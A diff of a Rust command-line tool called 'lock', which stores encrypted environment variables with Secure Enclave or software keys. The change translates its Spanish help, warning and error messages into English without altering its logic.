@@ -42,7 +42,7 @@ impl fmt::Display for Error {
     fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
         match self {
             Error::Msg(m) => f.write_str(m),
-            Error::Decrypt => f.write_str("no se pudo descifrar (clave incorrecta o archivo alterado)"),
+            Error::Decrypt => f.write_str("could not decrypt (wrong key or tampered file)"),
             Error::Io(e) => write!(f, "{e}"),
         }
     }
@@ -54,12 +54,12 @@ impl From<io::Error> for Error {
     }
 }
 
-/// Variables de entorno cifradas: en el Mac con Touch ID, en servidores con una clave.
+/// Encrypted environment variables: Touch ID on the Mac, a key on servers.
 #[derive(Parser)]
 #[command(
     name = "lock",
     version,
-    after_help = "Atajo para ejecutar con el entorno cargado:\n  lock -- npm run dev          (entorno del repo)\n  lock Navis -- npm run dev    (entorno explicito)"
+    after_help = "Shortcut to run with the environment loaded:\n  lock -- npm run dev          (repo environment)\n  lock Navis -- npm run dev    (explicit environment)"
 )]
 struct Cli {
     #[command(subcommand)]
@@ -68,102 +68,102 @@ struct Cli {
 
 #[derive(Subcommand)]
 enum Cmd {
-    /// Crea tu identidad (Secure Enclave en el Mac, clave de software en otro lado)
+    /// Create your identity (Secure Enclave on the Mac, a software key elsewhere)
     Init {
-        /// Nombre de la identidad (por defecto, el hostname)
+        /// Identity name (defaults to the hostname)
         #[arg(long)]
         name: Option<String>,
-        /// Usar clave de software (solo en equipos sin Secure Enclave)
+        /// Use a software key (only on machines without a Secure Enclave)
         #[arg(long)]
         software: bool,
-        /// No guardar: imprime una clave de software nueva para un servidor, CI o respaldo offline
+        /// Do not store: print a new software key for a server, CI or an offline backup
         #[arg(long)]
         print: bool,
     },
-    /// Muestra tu identidad publica (lockid1:...) para que te den acceso o confianza
+    /// Show your public identity (lockid1:...) so others can grant you access or trust
     Key,
-    /// Lista entornos, o los nombres de un entorno (sin descifrar)
+    /// List environments, or the names in an environment (without decrypting)
     #[command(alias = "ls")]
     List { env: Option<String> },
-    /// Crea un entorno vacio
+    /// Create an empty environment
     Create { env: String },
-    /// Borra un entorno de la boveda local
+    /// Delete an environment from the local vault
     Destroy {
         env: String,
         #[arg(long)]
         yes: bool,
     },
-    /// Guarda un secreto. El valor se lee de stdin o de un prompt oculto, nunca de los argumentos
+    /// Store a secret. The value is read from stdin or a hidden prompt, never from arguments
     Set {
-        /// ENV/NOMBRE, o NOMBRE dentro de un repo vinculado
+        /// ENV/NAME, or NAME inside a linked repo
         target: String,
-        /// Genera un valor aleatorio de N bytes (nadie lo ve)
+        /// Generate a random value of N bytes (nobody sees it)
         #[arg(long, value_name = "N")]
         generate: Option<usize>,
     },
-    /// Imprime el valor de un secreto (pide Touch ID)
+    /// Print a secret's value (asks for Touch ID)
     Get { target: String },
-    /// Borra un secreto
+    /// Delete a secret
     #[command(alias = "remove")]
     Rm { target: String },
-    /// Importa un archivo .env a un entorno (lo crea si no existe; si existe, agrega y reemplaza)
+    /// Import a .env file into an environment (creates it if missing; otherwise adds and overwrites)
     Import { env: String, file: PathBuf },
-    /// Ejecuta un comando con el entorno cargado. Atajo: `lock [ENV] -- cmd`
+    /// Run a command with the environment loaded. Shortcut: `lock [ENV] -- cmd`
     Exec {
-        /// Entorno (por defecto, el del repo)
+        /// Environment (defaults to the repo's)
         env: Option<String>,
-        /// No redactar la salida aunque no vaya a una terminal
+        /// Do not redact the output even when it is not going to a terminal
         #[arg(long)]
         no_redact: bool,
         #[arg(last = true, required = true)]
         command: Vec<String>,
     },
-    /// Imprime `export ...` para `eval "$(lock load)"` en tu shell
+    /// Print `export ...` for `eval "$(lock load)"` in your shell
     Load {
         env: Option<String>,
-        /// sh: `export K='v'`. github: enmascara los valores y los agrega a $GITHUB_ENV
+        /// sh: `export K='v'`. github: masks the values and appends them to $GITHUB_ENV
         #[arg(long, value_enum, default_value_t = LoadFormat::Sh)]
         format: LoadFormat,
     },
-    /// Vincula el repo actual a un entorno: escribe .env.lock e instala hooks
+    /// Link the current repo to an environment: writes .env.lock and installs hooks
     Link { env: String },
-    /// Copia el entorno de la boveda a .env.lock (lo usa el hook pre-commit)
+    /// Copy the environment from the vault to .env.lock (used by the pre-commit hook)
     Dump {
-        /// Ademas hacer `git add .env.lock`
+        /// Also run `git add .env.lock`
         #[arg(long)]
         stage: bool,
-        /// Sobrescribir aunque el repo tenga una version distinta
+        /// Overwrite even if the repo has a different version
         #[arg(long)]
         force: bool,
     },
-    /// Trae .env.lock del repo a la boveda local (si esta firmado y es mas nuevo)
+    /// Bring the repo's .env.lock into the local vault (if signed and newer)
     Pull {
-        /// Aceptar aunque haya conflicto de versiones (guarda copia .bak)
+        /// Accept even on a version conflict (keeps a .bak copy)
         #[arg(long)]
         force: bool,
     },
-    /// Verifica que las variables que usa el codigo esten en el lock
+    /// Check that the variables the code uses are in the lock
     Check {
-        /// Modo hook: revisa los commits que git va a subir (lee stdin)
+        /// Hook mode: check the commits git is about to push (reads stdin)
         #[arg(long)]
         pre_push: bool,
     },
-    /// Hooks de git: pre-commit actualiza .env.lock, pre-push corre `lock check`
+    /// Git hooks: pre-commit updates .env.lock, pre-push runs `lock check`
     Hooks {
         #[command(subcommand)]
         cmd: Option<HooksCmd>,
     },
-    /// Administra quien puede abrir un entorno
+    /// Manage who can open an environment
     Recipient {
         #[command(subcommand)]
         cmd: RecipientCmd,
     },
-    /// Destinatarios que se agregan a todo entorno nuevo (por ejemplo, tu respaldo)
+    /// Recipients added to every new environment (for example, your backup)
     Defaults {
         #[command(subcommand)]
         cmd: NamedCmd,
     },
-    /// Identidades cuya firma acepta este equipo (por ejemplo, tu otro Mac)
+    /// Identities whose signature this machine accepts (for example, your other Mac)
     Trust {
         #[command(subcommand)]
         cmd: NamedCmd,
@@ -172,12 +172,12 @@ enum Cmd {
 
 #[derive(Subcommand)]
 enum RecipientCmd {
-    /// Lista los destinatarios
+    /// List the recipients
     #[command(alias = "ls")]
     List { env: Option<String> },
-    /// Agrega un destinatario (por ejemplo, un servidor)
+    /// Add a recipient (for example, a server)
     Add { env: String, name: String, identity: String },
-    /// Quita un destinatario y rota la clave del entorno
+    /// Remove a recipient and rotate the environment key
     #[command(alias = "remove")]
     Rm { env: String, name: String },
 }
@@ -190,29 +190,29 @@ enum LoadFormat {
 
 #[derive(Subcommand)]
 enum HooksCmd {
-    /// Instala los hooks en el repo actual (ambos por defecto)
+    /// Install the hooks in the current repo (both by default)
     Install {
-        /// Solo el pre-commit (`lock dump --stage`)
+        /// Only the pre-commit hook (`lock dump --stage`)
         #[arg(long)]
         pre_commit: bool,
-        /// Solo el pre-push (`lock check --pre-push`)
+        /// Only the pre-push hook (`lock check --pre-push`)
         #[arg(long)]
         pre_push: bool,
     },
-    /// Quita los bloques de lock de los hooks (deja el resto intacto)
+    /// Remove lock's blocks from the hooks (leaves the rest intact)
     Uninstall,
-    /// Muestra que hooks estan instalados
+    /// Show which hooks are installed
     Status,
 }
 
 #[derive(Subcommand)]
 enum NamedCmd {
-    /// Muestra la lista
+    /// Show the list
     #[command(alias = "ls")]
     List,
-    /// Agrega una identidad (lockid1:..., la imprime `lock key` o `lock init --print`)
+    /// Add an identity (lockid1:..., printed by `lock key` or `lock init --print`)
     Add { name: String, identity: String },
-    /// Quita una identidad de la lista
+    /// Remove an identity from the list
     #[command(alias = "remove")]
     Rm { name: String },
 }
@@ -269,7 +269,7 @@ impl Ctx {
         let ids = identity::load_all(&self.store.keys_dir())?;
         if ids.is_empty() {
             return Err(Error::msg(format!(
-                "no hay claves en {} ni en ${}. Corre `lock init`.",
+                "no keys in {} or in ${}. Run `lock init`.",
                 self.store.keys_dir().display(),
                 identity::ENV_VAR
             )));
@@ -282,7 +282,7 @@ impl Ctx {
         let mut out = vec![];
         for id in identity::load_all(&self.store.keys_dir())? {
             for (i, t) in id.embedded_trust.iter().enumerate() {
-                out.push(Signer { name: format!("{}-confianza{}", id.name, i + 1), public: t.clone() });
+                out.push(Signer { name: format!("{}-trust{}", id.name, i + 1), public: t.clone() });
             }
             out.push(Signer { name: id.name.clone(), public: id.public.signing.clone() });
         }
@@ -317,7 +317,7 @@ impl Ctx {
             None => {
                 let path = self
                     .repo_file()
-                    .ok_or_else(|| Error::msg("no hay .env.lock aqui; indica el entorno (ENV o ENV/NOMBRE)"))?;
+                    .ok_or_else(|| Error::msg("no .env.lock here; specify the environment (ENV or ENV/NAME)"))?;
                 store::read_lockfile(&path)?.env
             }
         };
@@ -330,7 +330,7 @@ impl Ctx {
                 && let Ok(r) = store::read_lockfile(p)
                 && r.version != file.version
             {
-                eprintln!("lock: usando {env} v{} de la boveda (.env.lock de este repo: v{})", file.version, r.version);
+                eprintln!("lock: using {env} v{} from the vault (this repo's .env.lock: v{})", file.version, r.version);
             }
             return Ok(Resolved { file, in_vault: true, repo });
         }
@@ -341,11 +341,11 @@ impl Ctx {
                 self.store.check_seen(&file)?;
                 // Si no se puede registrar (home de solo lectura), se sigue sin proteccion de rollback.
                 if let Err(e) = self.store.record_seen(&file) {
-                    eprintln!("lock: aviso: no se pudo registrar la version vista ({e})");
+                    eprintln!("lock: warning: could not record the seen version ({e})");
                 }
                 Ok(Resolved { file, in_vault: false, repo: Some(p) })
             }
-            None => Err(Error::msg(format!("no existe el entorno {env}. `lock list` muestra los disponibles."))),
+            None => Err(Error::msg(format!("environment {env} does not exist. `lock list` shows the available ones."))),
         }
     }
 
@@ -371,7 +371,7 @@ impl Ctx {
         f(&mut u)?;
         let signer = &ids[0];
         if signer.kind == identity::Kind::Software && identity::enclave_available() {
-            eprintln!("lock: aviso: firmando con una clave de software ({})", signer.name);
+            eprintln!("lock: warning: signing with a software key ({})", signer.name);
         }
         let file = u.seal(signer, reason)?;
         self.persist(&r, &file)
@@ -404,7 +404,7 @@ fn reason(action: &str, detail: &str) -> String {
         .join(" ");
     const MAX: usize = 150;
     let shown = if clean.len() > MAX {
-        format!("{} [...{} caracteres...] {}", &clean[..70], clean.len() - 140, &clean[clean.len() - 70..])
+        format!("{} [...{} chars...] {}", &clean[..70], clean.len() - 140, &clean[clean.len() - 70..])
     } else {
         clean
     };
@@ -432,7 +432,7 @@ fn hostname() -> String {
 
 fn read_value(label: &str) -> Result<Zeroizing<String>, Error> {
     if io::stdin().is_terminal() {
-        return Ok(Zeroizing::new(rpassword::prompt_password(format!("Valor de {label} (oculto): "))?));
+        return Ok(Zeroizing::new(rpassword::prompt_password(format!("Value of {label} (hidden): "))?));
     }
     let mut v = Zeroizing::new(String::new());
     io::stdin().take(1024 * 1024).read_to_string(&mut v)?;
@@ -455,11 +455,11 @@ fn run(cmd: Cmd) -> Result<ExitCode, Error> {
                 println!("{}\t{}\t{}", id.name, id.kind.as_str(), id.public.encode());
             }
             if identity::enclave_available() && ids.iter().any(|i| i.kind == identity::Kind::Software) {
-                eprintln!("\nlock: AVISO: hay claves de software en este Mac. Cualquier proceso tuyo puede usarlas sin Touch ID.");
-                eprintln!("      Guardalas offline y borralas de {}.", ctx.store.keys_dir().display());
+                eprintln!("\nlock: WARNING: there are software keys on this Mac. Any process of yours can use them without Touch ID.");
+                eprintln!("      Store them offline and delete them from {}.", ctx.store.keys_dir().display());
             }
-            eprintln!("\nPara dar acceso:  lock recipient add <ENV> <nombre> <lockid1:...>");
-            eprintln!("Para confiar:     lock trust add <nombre> <lockid1:...>");
+            eprintln!("\nTo grant access:  lock recipient add <ENV> <name> <lockid1:...>");
+            eprintln!("To trust:         lock trust add <name> <lockid1:...>");
             Ok(ExitCode::SUCCESS)
         }
         Cmd::List { env: None } => cmd_list(&ctx),
@@ -472,43 +472,43 @@ fn run(cmd: Cmd) -> Result<ExitCode, Error> {
         }
         Cmd::Create { env } => {
             create(&ctx, &env)?;
-            eprintln!("Entorno {env} creado. Agrega secretos con `lock set {env}/NOMBRE`.");
+            eprintln!("Environment {env} created. Add secrets with `lock set {env}/NAME`.");
             Ok(ExitCode::SUCCESS)
         }
         Cmd::Destroy { env, yes } => {
             if !yes {
-                return Err(Error::msg(format!("esto borra {env} de la boveda local. Repite con --yes para confirmar.")));
+                return Err(Error::msg(format!("this deletes {env} from the local vault. Repeat with --yes to confirm.")));
             }
             if !ctx.store.delete(&env)? {
-                return Err(Error::msg(format!("no existe el entorno {env} en la boveda")));
+                return Err(Error::msg(format!("environment {env} does not exist in the vault")));
             }
-            eprintln!("Entorno {env} borrado de la boveda. Los .env.lock comiteados en repos siguen existiendo.");
+            eprintln!("Environment {env} deleted from the vault. .env.lock files committed in repos still exist.");
             Ok(ExitCode::SUCCESS)
         }
         Cmd::Set { target, generate } => {
             let (r, name) = ctx.target(&target)?;
             let env = r.file.env.clone();
             if !lockfile::valid_key_name(&name) {
-                return Err(Error::msg("nombre invalido (usa letras, numeros y _; no puede empezar con numero)"));
+                return Err(Error::msg("invalid name (use letters, digits and _; cannot start with a digit)"));
             }
             let value = match generate {
-                Some(n) if n == 0 || n > 1024 => return Err(Error::msg("--generate acepta entre 1 y 1024 bytes")),
+                Some(n) if n == 0 || n > 1024 => return Err(Error::msg("--generate accepts between 1 and 1024 bytes")),
                 Some(n) => {
                     use base64::Engine;
                     Zeroizing::new(base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(crypt::random_bytes(n)))
                 }
                 None => read_value(&format!("{env}/{name}"))?,
             };
-            ctx.modify(&env, &reason(&format!("guardar {env}/{name}"), ""), |u| u.set(&name, &value))?;
-            eprintln!("{env}/{name} guardado.");
+            ctx.modify(&env, &reason(&format!("store {env}/{name}"), ""), |u| u.set(&name, &value))?;
+            eprintln!("{env}/{name} stored.");
             Ok(ExitCode::SUCCESS)
         }
         Cmd::Get { target } => {
             let (r, name) = ctx.target(&target)?;
             if !r.file.contains(&name) {
-                return Err(Error::msg(format!("{}/{name} no existe", r.file.env)));
+                return Err(Error::msg(format!("{}/{name} does not exist", r.file.env)));
             }
-            let u = ctx.open(&r, &reason(&format!("MOSTRAR en texto plano {}/{name}", r.file.env), ""))?;
+            let u = ctx.open(&r, &reason(&format!("SHOW in plain text {}/{name}", r.file.env), ""))?;
             println!("{}", u.get(&name)?.as_deref().map(String::as_str).unwrap_or(""));
             Ok(ExitCode::SUCCESS)
         }
@@ -516,13 +516,13 @@ fn run(cmd: Cmd) -> Result<ExitCode, Error> {
             let (r, name) = ctx.target(&target)?;
             let env = r.file.env.clone();
             if !r.file.contains(&name) {
-                return Err(Error::msg(format!("{env}/{name} no existe")));
+                return Err(Error::msg(format!("{env}/{name} does not exist")));
             }
-            ctx.modify(&env, &reason(&format!("borrar {env}/{name}"), ""), |u| {
+            ctx.modify(&env, &reason(&format!("delete {env}/{name}"), ""), |u| {
                 u.remove(&name);
                 Ok(())
             })?;
-            eprintln!("{env}/{name} borrado.");
+            eprintln!("{env}/{name} deleted.");
             Ok(ExitCode::SUCCESS)
         }
         Cmd::Import { env, file } => {
@@ -533,19 +533,19 @@ fn run(cmd: Cmd) -> Result<ExitCode, Error> {
             if ctx.resolve(Some(&env)).is_err() {
                 create(&ctx, &env)?;
             }
-            ctx.modify(&env, &reason(&format!("importar {} variables a {env}", pairs.len()), ""), |u| {
+            ctx.modify(&env, &reason(&format!("import {} variables into {env}", pairs.len()), ""), |u| {
                 for (k, v) in &pairs {
                     u.set(k, v)?;
                 }
                 Ok(())
             })?;
-            eprintln!("{} variables importadas a {env}. Borra {} (no lo comitees).", pairs.len(), file.display());
+            eprintln!("{} variables imported into {env}. Delete {} (do not commit it).", pairs.len(), file.display());
             Ok(ExitCode::SUCCESS)
         }
         Cmd::Exec { env, no_redact, command } => cmd_exec(&ctx, env.as_deref(), no_redact, &command),
         Cmd::Load { env, format } => {
             let r = ctx.resolve(env.as_deref())?;
-            let u = ctx.open(&r, &reason(&format!("EXPORTAR {} completo en texto plano", r.file.env), ""))?;
+            let u = ctx.open(&r, &reason(&format!("EXPORT all of {} in plain text", r.file.env), ""))?;
             let values = u.all()?;
             match format {
                 LoadFormat::Sh => {
@@ -574,7 +574,7 @@ fn run(cmd: Cmd) -> Result<ExitCode, Error> {
 fn cmd_init(ctx: &Ctx, name: Option<String>, software: bool, print: bool) -> Result<ExitCode, Error> {
     let name = name.unwrap_or_else(hostname);
     if !lockfile::valid_id_name(&name) {
-        return Err(Error::msg("nombre invalido (usa letras, numeros, . _ -)"));
+        return Err(Error::msg("invalid name (use letters, digits, . _ -)"));
     }
     if print {
         // La clave nueva lleva fijados como de confianza a los firmantes de este
@@ -582,30 +582,30 @@ fn cmd_init(ctx: &Ctx, name: Option<String>, software: bool, print: bool) -> Res
         let trust: Vec<Vec<u8>> = ctx.trusted()?.into_iter().map(|s| s.public).collect();
         let id = Identity::new_software(&name);
         println!("{}", *id.private_string(&trust).unwrap());
-        eprintln!("Identidad de {name}: {}", id.public.encode());
-        eprintln!("1. Guarda la linea de stdout como secreto {} en el servidor/CI (o en un gestor offline si es un respaldo).", identity::ENV_VAR);
-        eprintln!("2. Dale acceso aqui:  lock recipient add <ENV> {name} {}", id.public.encode());
-        eprintln!("   (respaldo para todo entorno nuevo:  lock defaults add {name} {})", id.public.encode());
+        eprintln!("Identity of {name}: {}", id.public.encode());
+        eprintln!("1. Store the stdout line as secret {} on the server/CI (or in an offline manager if it is a backup).", identity::ENV_VAR);
+        eprintln!("2. Grant it access here:  lock recipient add <ENV> {name} {}", id.public.encode());
+        eprintln!("   (backup for every new environment:  lock defaults add {name} {})", id.public.encode());
         if trust.is_empty() {
-            eprintln!("AVISO: este equipo no tiene identidades; la clave no confia en ningun firmante.");
+            eprintln!("WARNING: this machine has no identities; the key does not trust any signer.");
         }
         return Ok(ExitCode::SUCCESS);
     }
     let se = identity::enclave_available();
     if software && se {
         return Err(Error::msg(
-            "este Mac tiene Secure Enclave: una clave de software guardada aqui permitiria descifrar sin Touch ID. \
-             Usa `lock init` (Secure Enclave), o `lock init --print` para generar una clave de servidor o de respaldo offline.",
+            "this Mac has a Secure Enclave: a software key stored here would allow decrypting without Touch ID. \
+             Use `lock init` (Secure Enclave), or `lock init --print` to generate a server key or an offline backup key.",
         ));
     }
     let mut id = if se { Identity::new_enclave(&name)? } else { Identity::new_software(&name) };
     let path = id.save(&ctx.store.keys_dir())?;
-    eprintln!("Identidad {name} ({}) creada en {}", id.kind.as_str(), path.display());
+    eprintln!("Identity {name} ({}) created at {}", id.kind.as_str(), path.display());
     if id.kind == identity::Kind::Enclave {
-        eprintln!("Las claves viven en el Secure Enclave: no se pueden copiar y cada uso pide Touch ID.");
-        eprintln!("Si este Mac se pierde, se pierden. Crea un respaldo offline y registralo para todo entorno nuevo:");
-        eprintln!("  lock init --print --name respaldo    # guarda la clave en tu gestor de contrasenas");
-        eprintln!("  lock defaults add respaldo <lockid1:...>");
+        eprintln!("The keys live in the Secure Enclave: they cannot be copied and every use asks for Touch ID.");
+        eprintln!("If this Mac is lost, so are they. Create an offline backup and register it for every new environment:");
+        eprintln!("  lock init --print --name backup    # store the key in your password manager");
+        eprintln!("  lock defaults add backup <lockid1:...>");
     }
     println!("{}", id.public.encode());
     Ok(ExitCode::SUCCESS)
@@ -613,11 +613,11 @@ fn cmd_init(ctx: &Ctx, name: Option<String>, software: bool, print: bool) -> Res
 
 fn create(ctx: &Ctx, env: &str) -> Result<(), Error> {
     if !lockfile::valid_env_name(env) {
-        return Err(Error::msg("nombre de entorno invalido (usa letras, numeros, . _ -)"));
+        return Err(Error::msg("invalid environment name (use letters, digits, . _ -)"));
     }
     let _guard = ctx.store.lock_env(env)?;
     if ctx.store.exists(env) {
-        return Err(Error::msg(format!("ya existe el entorno {env}")));
+        return Err(Error::msg(format!("environment {env} already exists")));
     }
     let ids = ctx.identities()?;
     // Destinatarios iniciales: tus claves guardadas (no LOCK_KEY) y los defaults (p. ej. respaldo).
@@ -633,9 +633,9 @@ fn create(ctx: &Ctx, env: &str) -> Result<(), Error> {
         }
     }
     if recipients.is_empty() {
-        return Err(Error::msg("no hay claves guardadas en este equipo. Corre `lock init`."));
+        return Err(Error::msg("no stored keys on this machine. Run `lock init`."));
     }
-    let file = LockFile::create(env, &recipients)?.seal(&ids[0], &reason(&format!("crear {env}"), ""))?;
+    let file = LockFile::create(env, &recipients)?.seal(&ids[0], &reason(&format!("create {env}"), ""))?;
     ctx.store.save(&file)
 }
 
@@ -644,20 +644,20 @@ fn cmd_list(ctx: &Ctx) -> Result<ExitCode, Error> {
     let repo = ctx.repo_file().and_then(|p| store::read_lockfile(&p).ok());
     let envs = ctx.store.list()?;
     if envs.is_empty() && repo.is_none() {
-        eprintln!("No hay entornos. Crea uno con `lock create <Nombre>`.");
+        eprintln!("No environments. Create one with `lock create <Name>`.");
     }
     let describe = |f: &LockFile| {
         let who: Vec<&str> = f.recipients.iter().map(|r| r.name.as_str()).collect();
         let warn = match f.verify(&trusted) {
             Ok(_) => String::new(),
-            Err(_) => "  ! firma no confiable".into(),
+            Err(_) => "  ! untrusted signature".into(),
         };
-        format!("{}\tv{}\t{} secretos\t[{}]{warn}", f.env, f.version, f.len(), who.join(", "))
+        format!("{}\tv{}\t{} secrets\t[{}]{warn}", f.env, f.version, f.len(), who.join(", "))
     };
     for env in &envs {
         match ctx.store.load(env) {
             Ok(Some(f)) => {
-                let mark = if repo.as_ref().is_some_and(|r| r.env == *env) { "  * este repo" } else { "" };
+                let mark = if repo.as_ref().is_some_and(|r| r.env == *env) { "  * this repo" } else { "" };
                 println!("{}{mark}", describe(&f));
             }
             Ok(None) => {}
@@ -667,7 +667,7 @@ fn cmd_list(ctx: &Ctx) -> Result<ExitCode, Error> {
     if let Some(f) = repo
         && !envs.contains(&f.env)
     {
-        println!("{}  (solo en .env.lock de este repo)", describe(&f));
+        println!("{}  (only in this repo's .env.lock)", describe(&f));
     }
     Ok(ExitCode::SUCCESS)
 }
@@ -698,9 +698,9 @@ fn deliver(pid: i32, sig: libc::c_int) {
 fn cmd_exec(ctx: &Ctx, env: Option<&str>, no_redact: bool, argv: &[String]) -> Result<ExitCode, Error> {
     let r = ctx.resolve(env)?;
     let action = if no_redact {
-        format!("SIN REDACCION, ejecutar con {}", r.file.env)
+        format!("UNREDACTED, run with {}", r.file.env)
     } else {
-        format!("ejecutar con {}", r.file.env)
+        format!("run with {}", r.file.env)
     };
     let values = ctx.open(&r, &reason(&action, &argv.join(" ")))?.all()?;
 
@@ -770,11 +770,11 @@ fn cmd_exec(ctx: &Ctx, env: Option<&str>, no_redact: bool, argv: &[String]) -> R
             Ok(Ok(())) => {}
             Ok(Err(e)) if e.kind() == io::ErrorKind::BrokenPipe => {}
             Ok(Err(e)) => {
-                eprintln!("lock: error copiando la salida: {e}");
+                eprintln!("lock: error copying the output: {e}");
                 copy_failed = true;
             }
             Err(_) => {
-                eprintln!("lock: un proceso hijo sigue con la salida abierta; se deja de leer");
+                eprintln!("lock: a child process still has the output open; no longer reading it");
                 break;
             }
         }
@@ -789,21 +789,21 @@ fn cmd_exec(ctx: &Ctx, env: Option<&str>, no_redact: bool, argv: &[String]) -> R
 fn git(dir: &Path, args: &[&str]) -> Result<(), Error> {
     let ok = Command::new("git").arg("-C").arg(dir).args(args).status()?.success();
     if !ok {
-        return Err(Error::msg(format!("git {} fallo", args.join(" "))));
+        return Err(Error::msg(format!("git {} failed", args.join(" "))));
     }
     Ok(())
 }
 
 fn cmd_link(ctx: &Ctx, env: &str) -> Result<ExitCode, Error> {
-    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("no estas dentro de un repo git"))?;
-    let file = ctx.store.load(env)?.ok_or_else(|| Error::msg(format!("no existe el entorno {env} en la boveda")))?;
+    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("not inside a git repo"))?;
+    let file = ctx.store.load(env)?.ok_or_else(|| Error::msg(format!("environment {env} does not exist in the vault")))?;
     ctx.verify(&file)?;
     let path = root.join(store::REPO_FILE);
     if let Ok(current) = store::read_lockfile(&path)
         && current.env != env
     {
         return Err(Error::msg(format!(
-            "{} ya es de {}; borralo primero si quieres cambiarlo",
+            "{} already belongs to {}; delete it first if you want to change it",
             path.display(),
             current.env
         )));
@@ -819,10 +819,10 @@ fn cmd_link(ctx: &Ctx, env: &str) -> Result<ExitCode, Error> {
         store::write_atomic(&attrs, format!("{current}{sep}.env.lock -merge\n").as_bytes(), 0o644)?;
     }
     for p in hooks::install(&root, &["pre-commit", "pre-push"])? {
-        eprintln!("hook instalado: {}", p.display());
+        eprintln!("hook installed: {}", p.display());
     }
-    eprintln!("Repo vinculado a {env}: {}", path.display());
-    eprintln!("Comitea .env.lock y .gitattributes. .env (texto plano) debe estar en .gitignore.");
+    eprintln!("Repo linked to {env}: {}", path.display());
+    eprintln!("Commit .env.lock and .gitattributes. .env (plain text) must be in .gitignore.");
     Ok(ExitCode::SUCCESS)
 }
 
@@ -831,7 +831,7 @@ fn cmd_link(ctx: &Ctx, env: &str) -> Result<ExitCode, Error> {
 /// aleatorio para que un valor no pueda inyectar otras variables.
 fn load_github(values: &[(String, lockfile::Value)]) -> Result<(), Error> {
     use std::io::Write;
-    let path = std::env::var_os("GITHUB_ENV").ok_or_else(|| Error::msg("GITHUB_ENV no esta definido (solo funciona dentro de GitHub Actions)"))?;
+    let path = std::env::var_os("GITHUB_ENV").ok_or_else(|| Error::msg("GITHUB_ENV is not set (only works inside GitHub Actions)"))?;
     // Primero todas las mascaras, antes de que el valor pueda aparecer en un log.
     for (_, v) in values {
         for line in v.lines().filter(|l| l.trim().len() >= redact::MIN_LEN) {
@@ -848,12 +848,12 @@ fn load_github(values: &[(String, lockfile::Value)]) -> Result<(), Error> {
         out.push_str(&format!("{k}<<LOCK_{delim}\n{}\nLOCK_{delim}\n", v.as_str()));
     }
     std::fs::OpenOptions::new().append(true).open(path)?.write_all(out.as_bytes())?;
-    eprintln!("lock: {} variables exportadas a los pasos siguientes (enmascaradas en los logs).", values.len());
+    eprintln!("lock: {} variables exported to the following steps (masked in logs).", values.len());
     Ok(())
 }
 
 fn cmd_hooks(ctx: &Ctx, cmd: HooksCmd) -> Result<ExitCode, Error> {
-    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("no estas dentro de un repo git"))?;
+    let root = store::repo_root(&ctx.cwd).ok_or_else(|| Error::msg("not inside a git repo"))?;
     match cmd {
         HooksCmd::Install { pre_commit, pre_push } => {
             let which: Vec<&str> = match (pre_commit, pre_push) {
@@ -862,29 +862,29 @@ fn cmd_hooks(ctx: &Ctx, cmd: HooksCmd) -> Result<ExitCode, Error> {
                 _ => vec!["pre-commit", "pre-push"],
             };
             for p in hooks::install(&root, &which)? {
-                eprintln!("hook instalado: {}", p.display());
+                eprintln!("hook installed: {}", p.display());
             }
             if ctx.binding().is_none() {
-                eprintln!("Nota: este repo no esta vinculado; el pre-commit no hara nada hasta `lock link <ENV>`.");
+                eprintln!("Note: this repo is not linked; the pre-commit hook will do nothing until `lock link <ENV>`.");
             }
         }
         HooksCmd::Uninstall => {
             let touched = hooks::uninstall(&root)?;
             if touched.is_empty() {
-                eprintln!("No habia hooks de lock instalados.");
+                eprintln!("No lock hooks were installed.");
             }
             for p in touched {
-                eprintln!("hook quitado: {}", p.display());
+                eprintln!("hook removed: {}", p.display());
             }
         }
         HooksCmd::Status => {
             for (hook, path, installed) in hooks::status(&root)? {
                 let cmd = hooks::HOOKS.iter().find(|(h, _)| *h == hook).map_or("", |(_, c)| c);
-                let state = if installed { "instalado" } else { "no instalado" };
+                let state = if installed { "installed" } else { "not installed" };
                 println!("{hook}\t{state}\t{cmd}\t{}", path.display());
             }
             if ctx.binding().is_none() {
-                eprintln!("Este repo no esta vinculado a ningun entorno (`lock link <ENV>`).");
+                eprintln!("This repo is not linked to any environment (`lock link <ENV>`).");
             }
         }
     }
@@ -905,22 +905,22 @@ fn cmd_dump(ctx: &Ctx, stage: bool, force: bool) -> Result<ExitCode, Error> {
     {
         if repo.version > vault.version {
             return Err(Error::msg(format!(
-                ".env.lock ({env} v{}) es mas nuevo que la boveda (v{}) y esta firmado por alguien de confianza. \
-                 Traelo con `lock pull`, o pisalo con `lock dump --force`.",
+                ".env.lock ({env} v{}) is newer than the vault (v{}) and is signed by someone you trust. \
+                 Bring it in with `lock pull`, or overwrite it with `lock dump --force`.",
                 repo.version, vault.version
             )));
         }
         if repo.version == vault.version && repo.digest() != vault.digest() {
             return Err(Error::msg(format!(
-                "conflicto: .env.lock y la boveda tienen {env} v{} con contenido distinto. \
-                 Elige: `lock pull --force` (gana el repo) o `lock dump --force` (gana la boveda).",
+                "conflict: .env.lock and the vault have {env} v{} with different content. \
+                 Choose: `lock pull --force` (the repo wins) or `lock dump --force` (the vault wins).",
                 vault.version
             )));
         }
     }
     if trusted_repo.as_ref() != Some(&vault) {
         store::write_atomic(&path, vault.serialize().as_bytes(), 0o644)?;
-        eprintln!("lock: .env.lock actualizado a {env} v{}", vault.version);
+        eprintln!("lock: .env.lock updated to {env} v{}", vault.version);
     }
     if stage {
         git(path.parent().unwrap_or(Path::new(".")), &["add", "--", store::REPO_FILE])?;
@@ -929,12 +929,12 @@ fn cmd_dump(ctx: &Ctx, stage: bool, force: bool) -> Result<ExitCode, Error> {
 }
 
 fn cmd_pull(ctx: &Ctx, force: bool) -> Result<ExitCode, Error> {
-    let path = ctx.repo_file().ok_or_else(|| Error::msg("no hay .env.lock en este repo"))?;
+    let path = ctx.repo_file().ok_or_else(|| Error::msg("no .env.lock in this repo"))?;
     let repo = store::read_lockfile(&path)?;
     if let Some(b) = ctx.binding()
         && b != repo.env
     {
-        return Err(Error::msg(format!(".env.lock dice {} pero este repo esta vinculado a {b}", repo.env)));
+        return Err(Error::msg(format!(".env.lock says {} but this repo is linked to {b}", repo.env)));
     }
     // Antes de tocar la boveda: firma de confianza.
     let signer = repo.verify(&ctx.trusted()?)?.to_string();
